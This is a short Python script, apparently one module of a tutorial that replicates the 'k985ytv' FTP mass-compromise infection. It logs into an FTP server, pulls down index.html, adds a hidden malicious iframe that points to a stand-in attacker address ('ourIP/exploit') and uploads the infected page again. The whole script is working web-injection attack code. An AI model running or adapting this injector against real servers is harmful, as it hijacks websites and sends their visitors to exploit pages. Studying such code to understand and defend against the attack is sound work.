#!/usr/bin/python3

"""
FTP Mass Compromise replication of k985ytv infection
Module 4 - FTP Web Page Injector
"""

import ftplib

def injectPage( ftp, page, redirect ):
    with open(page+'.tmp','w') as f:
        ftp.retrlines( 'RETR ' + page , f.write )
        print("[+] Downloaded page : " + page)
        f.write(redirect)
    
    print("[+] Injected Malicious IFrame on : " + page)
    ftp.storlines('STOR ' + page,open(page+'.tmp'))
    print("[+] Successfully Uploaded the Injected Page : " + page)
    

host     = ''
user     = ''
passwd   = ''
redirect = '<iframe src = http://ourIP/exploit></iframe>'

ftp = ftplib.FTP(host)
ftp.login(user,passwd)

injectPage( ftp, 'index.html', redirect )
